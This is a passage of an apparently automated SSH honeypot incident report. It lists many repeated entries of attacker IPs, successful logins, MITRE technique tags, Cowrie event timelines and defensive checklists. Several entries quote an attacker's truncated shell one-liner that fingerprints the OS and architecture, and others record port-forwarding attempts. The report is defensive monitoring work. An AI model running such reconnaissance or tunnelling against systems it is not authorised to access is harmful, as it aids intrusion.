| **First Seen** | 2026-08-23 13:59 |
| **Last Seen** | 2026-08-23 13:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:59:49` | `cowrie.session.connect` |
| `2026-08-23 13:59:49` | `cowrie.client.version` |
| `2026-08-23 13:59:49` | `cowrie.client.kex` |
| `2026-08-23 13:59:50` | `cowrie.login.success` |
| `2026-08-23 13:59:51` | `cowrie.session.params` |
| `2026-08-23 13:59:51` | `cowrie.command.input` |
| `2026-08-23 13:59:51` | `cowrie.command.input` |
| `2026-08-23 13:59:51` | `cowrie.command.input` |
| `2026-08-23 13:59:51` | `cowrie.command.input` |
| `2026-08-23 13:59:51` | `cowrie.command.input` |
| `2026-08-23 13:59:51` | `cowrie.command.success` |
| `2026-08-23 13:59:51` | `cowrie.command.input` |
| `2026-08-23 13:59:51` | `cowrie.command.input` |
| `2026-08-23 13:59:51` | `cowrie.command.input` |
| `2026-08-23 13:59:51` | `cowrie.command.input` |
| `2026-08-23 13:59:51` | `cowrie.log.closed` |
| `2026-08-23 13:59:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ff4a2739c71

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 14:02 |
| **Last Seen** | 2026-08-23 14:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:02:12` | `cowrie.session.connect` |
| `2026-08-23 14:02:12` | `cowrie.client.version` |
| `2026-08-23 14:02:12` | `cowrie.client.kex` |
| `2026-08-23 14:02:13` | `cowrie.login.success` |
| `2026-08-23 14:02:14` | `cowrie.session.params` |
| `2026-08-23 14:02:14` | `cowrie.command.input` |
| `2026-08-23 14:02:14` | `cowrie.command.input` |
| `2026-08-23 14:02:14` | `cowrie.command.input` |
| `2026-08-23 14:02:14` | `cowrie.command.input` |
| `2026-08-23 14:02:14` | `cowrie.command.input` |
| `2026-08-23 14:02:14` | `cowrie.command.success` |
| `2026-08-23 14:02:14` | `cowrie.command.input` |
| `2026-08-23 14:02:14` | `cowrie.command.input` |
| `2026-08-23 14:02:14` | `cowrie.command.input` |
| `2026-08-23 14:02:14` | `cowrie.command.input` |
| `2026-08-23 14:02:15` | `cowrie.log.closed` |
| `2026-08-23 14:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8851d82f635e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 14:04 |
| **Last Seen** | 2026-08-23 14:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:04:38` | `cowrie.session.connect` |
| `2026-08-23 14:04:38` | `cowrie.client.version` |
| `2026-08-23 14:04:38` | `cowrie.client.kex` |
| `2026-08-23 14:04:39` | `cowrie.login.success` |
| `2026-08-23 14:04:39` | `cowrie.session.params` |
| `2026-08-23 14:04:39` | `cowrie.command.input` |
| `2026-08-23 14:04:39` | `cowrie.command.input` |
| `2026-08-23 14:04:39` | `cowrie.command.input` |
| `2026-08-23 14:04:39` | `cowrie.command.input` |
| `2026-08-23 14:04:39` | `cowrie.command.input` |
| `2026-08-23 14:04:39` | `cowrie.command.success` |
| `2026-08-23 14:04:39` | `cowrie.command.input` |
| `2026-08-23 14:04:39` | `cowrie.command.input` |
| `2026-08-23 14:04:39` | `cowrie.command.input` |
| `2026-08-23 14:04:39` | `cowrie.command.input` |
| `2026-08-23 14:04:40` | `cowrie.log.closed` |
| `2026-08-23 14:04:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-758349176c87

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 14:04 |
| **Last Seen** | 2026-08-23 14:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:04:58` | `cowrie.session.connect` |
| `2026-08-23 14:04:58` | `cowrie.client.version` |
| `2026-08-23 14:04:58` | `cowrie.client.kex` |
| `2026-08-23 14:04:59` | `cowrie.login.success` |
| `2026-08-23 14:04:59` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:05:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 14:05:00` | `cowrie.direct-tcpip.data` |
| `2026-08-23 14:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-384fe3bcd10b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 14:05 |
| **Last Seen** | 2026-08-23 14:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:05:02` | `cowrie.session.connect` |
| `2026-08-23 14:05:02` | `cowrie.client.version` |
| `2026-08-23 14:05:02` | `cowrie.client.kex` |
| `2026-08-23 14:05:03` | `cowrie.login.success` |
| `2026-08-23 14:05:03` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:05:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 14:05:03` | `cowrie.direct-tcpip.data` |
| `2026-08-23 14:05:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc63b616be34

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 14:07 |
| **Last Seen** | 2026-08-23 14:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:07:07` | `cowrie.session.connect` |
| `2026-08-23 14:07:07` | `cowrie.client.version` |
| `2026-08-23 14:07:07` | `cowrie.client.kex` |
| `2026-08-23 14:07:08` | `cowrie.login.success` |
| `2026-08-23 14:07:10` | `cowrie.session.params` |
| `2026-08-23 14:07:10` | `cowrie.command.input` |
| `2026-08-23 14:07:10` | `cowrie.command.input` |
| `2026-08-23 14:07:10` | `cowrie.command.input` |
| `2026-08-23 14:07:10` | `cowrie.command.input` |
| `2026-08-23 14:07:10` | `cowrie.command.input` |
| `2026-08-23 14:07:10` | `cowrie.command.success` |
| `2026-08-23 14:07:10` | `cowrie.command.input` |
| `2026-08-23 14:07:10` | `cowrie.command.input` |
| `2026-08-23 14:07:10` | `cowrie.command.input` |
| `2026-08-23 14:07:10` | `cowrie.command.input` |
| `2026-08-23 14:07:10` | `cowrie.log.closed` |
| `2026-08-23 14:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfb2783f7066

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 14:09 |
| **Last Seen** | 2026-08-23 14:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:09:43` | `cowrie.session.connect` |
| `2026-08-23 14:09:43` | `cowrie.client.version` |
| `2026-08-23 14:09:44` | `cowrie.client.kex` |
| `2026-08-23 14:09:44` | `cowrie.login.success` |
| `2026-08-23 14:09:45` | `cowrie.session.params` |
| `2026-08-23 14:09:45` | `cowrie.command.input` |
| `2026-08-23 14:09:45` | `cowrie.command.input` |
| `2026-08-23 14:09:45` | `cowrie.command.input` |
| `2026-08-23 14:09:45` | `cowrie.command.input` |
| `2026-08-23 14:09:45` | `cowrie.command.input` |
| `2026-08-23 14:09:45` | `cowrie.command.success` |
| `2026-08-23 14:09:45` | `cowrie.command.input` |
| `2026-08-23 14:09:45` | `cowrie.command.input` |
| `2026-08-23 14:09:45` | `cowrie.command.input` |
| `2026-08-23 14:09:45` | `cowrie.command.input` |
| `2026-08-23 14:09:46` | `cowrie.log.closed` |
| `2026-08-23 14:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5699ae83a62c

| Field | Detail |
|---|---|
| **Source IP** | `78.189.17[.]35` |
| **First Seen** | 2026-08-23 14:10 |
| **Last Seen** | 2026-08-23 14:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:10:43` | `cowrie.session.connect` |
| `2026-08-23 14:10:44` | `cowrie.client.version` |
| `2026-08-23 14:10:44` | `cowrie.client.kex` |
| `2026-08-23 14:10:45` | `cowrie.login.success` |
| `2026-08-23 14:10:45` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.189.17[.]35` to AbuseIPDB if not already reported
- [ ] Block `78.189.17[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdaf0eedc637

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 14:12 |
| **Last Seen** | 2026-08-23 14:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:12:25` | `cowrie.session.connect` |
| `2026-08-23 14:12:26` | `cowrie.client.version` |
| `2026-08-23 14:12:26` | `cowrie.client.kex` |
| `2026-08-23 14:12:26` | `cowrie.login.success` |
| `2026-08-23 14:12:27` | `cowrie.session.params` |
| `2026-08-23 14:12:27` | `cowrie.command.input` |
| `2026-08-23 14:12:27` | `cowrie.command.input` |
| `2026-08-23 14:12:27` | `cowrie.command.input` |
| `2026-08-23 14:12:27` | `cowrie.command.input` |
| `2026-08-23 14:12:27` | `cowrie.command.input` |
| `2026-08-23 14:12:27` | `cowrie.command.success` |
| `2026-08-23 14:12:27` | `cowrie.command.input` |
| `2026-08-23 14:12:27` | `cowrie.command.input` |
| `2026-08-23 14:12:27` | `cowrie.command.input` |
| `2026-08-23 14:12:27` | `cowrie.command.input` |
| `2026-08-23 14:12:28` | `cowrie.log.closed` |
| `2026-08-23 14:12:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8903e632ce85

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 14:14 |
| **Last Seen** | 2026-08-23 14:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:14:36` | `cowrie.session.connect` |
| `2026-08-23 14:14:36` | `cowrie.client.version` |
| `2026-08-23 14:14:36` | `cowrie.client.kex` |
| `2026-08-23 14:14:37` | `cowrie.login.success` |
| `2026-08-23 14:14:37` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:14:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 14:14:37` | `cowrie.direct-tcpip.data` |
| `2026-08-23 14:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-286c4735f9a8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 14:14 |
| **Last Seen** | 2026-08-23 14:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:14:41` | `cowrie.session.connect` |
| `2026-08-23 14:14:41` | `cowrie.client.version` |
| `2026-08-23 14:14:41` | `cowrie.client.kex` |
| `2026-08-23 14:14:42` | `cowrie.login.success` |
| `2026-08-23 14:14:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:14:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 14:14:42` | `cowrie.direct-tcpip.data` |
| `2026-08-23 14:14:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da218c42946a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 14:15 |
| **Last Seen** | 2026-08-23 14:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:15:02` | `cowrie.session.connect` |
| `2026-08-23 14:15:02` | `cowrie.client.version` |
| `2026-08-23 14:15:02` | `cowrie.client.kex` |
| `2026-08-23 14:15:03` | `cowrie.login.success` |
| `2026-08-23 14:15:05` | `cowrie.session.params` |
| `2026-08-23 14:15:05` | `cowrie.command.input` |
| `2026-08-23 14:15:05` | `cowrie.command.input` |
| `2026-08-23 14:15:05` | `cowrie.command.input` |
| `2026-08-23 14:15:05` | `cowrie.command.input` |
| `2026-08-23 14:15:05` | `cowrie.command.input` |
| `2026-08-23 14:15:05` | `cowrie.command.success` |
| `2026-08-23 14:15:05` | `cowrie.command.input` |
| `2026-08-23 14:15:05` | `cowrie.command.input` |
| `2026-08-23 14:15:05` | `cowrie.command.input` |
| `2026-08-23 14:15:05` | `cowrie.command.input` |
| `2026-08-23 14:15:05` | `cowrie.log.closed` |
| `2026-08-23 14:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d17861c40d86

| Field | Detail |
|---|---|
| **Source IP** | `186.200.6[.]38` |
| **First Seen** | 2026-08-23 14:15 |
| **Last Seen** | 2026-08-23 14:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:15:13` | `cowrie.session.connect` |
| `2026-08-23 14:15:14` | `cowrie.client.version` |
| `2026-08-23 14:15:14` | `cowrie.client.kex` |
| `2026-08-23 14:15:16` | `cowrie.login.success` |
| `2026-08-23 14:15:17` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:15:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.200.6[.]38` to AbuseIPDB if not already reported
- [ ] Block `186.200.6[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4f1619283ed

| Field | Detail |
|---|---|
| **Source IP** | `78.72.168[.]178` |
| **First Seen** | 2026-08-23 14:15 |
| **Last Seen** | 2026-08-23 14:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:15:26` | `cowrie.session.connect` |
| `2026-08-23 14:15:26` | `cowrie.client.version` |
| `2026-08-23 14:15:26` | `cowrie.client.kex` |
| `2026-08-23 14:15:27` | `cowrie.login.success` |
| `2026-08-23 14:15:28` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:15:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.72.168[.]178` to AbuseIPDB if not already reported
- [ ] Block `78.72.168[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-418d622bf463

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 14:17 |
| **Last Seen** | 2026-08-23 14:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:17:44` | `cowrie.session.connect` |
| `2026-08-23 14:17:44` | `cowrie.client.version` |
| `2026-08-23 14:17:44` | `cowrie.client.kex` |
| `2026-08-23 14:17:45` | `cowrie.login.success` |
| `2026-08-23 14:17:46` | `cowrie.session.params` |
| `2026-08-23 14:17:46` | `cowrie.command.input` |
| `2026-08-23 14:17:46` | `cowrie.command.input` |
| `2026-08-23 14:17:46` | `cowrie.command.input` |
| `2026-08-23 14:17:46` | `cowrie.command.input` |
| `2026-08-23 14:17:46` | `cowrie.command.input` |
| `2026-08-23 14:17:46` | `cowrie.command.success` |
| `2026-08-23 14:17:46` | `cowrie.command.input` |
| `2026-08-23 14:17:46` | `cowrie.command.input` |
| `2026-08-23 14:17:46` | `cowrie.command.input` |
| `2026-08-23 14:17:46` | `cowrie.command.input` |
| `2026-08-23 14:17:46` | `cowrie.log.closed` |
| `2026-08-23 14:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3357ec5011f2

| Field | Detail |
|---|---|
| **Source IP** | `124.88.174[.]143` |
| **First Seen** | 2026-08-23 14:19 |
| **Last Seen** | 2026-08-23 14:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:19:59` | `cowrie.session.connect` |
| `2026-08-23 14:19:59` | `cowrie.client.version` |
| `2026-08-23 14:19:59` | `cowrie.client.kex` |
| `2026-08-23 14:20:02` | `cowrie.login.success` |
| `2026-08-23 14:20:02` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:20:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.88.174[.]143` to AbuseIPDB if not already reported
- [ ] Block `124.88.174[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-187b623af2e7

| Field | Detail |
|---|---|
| **Source IP** | `126.13.48[.]207` |
| **First Seen** | 2026-08-23 14:20 |
| **Last Seen** | 2026-08-23 14:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
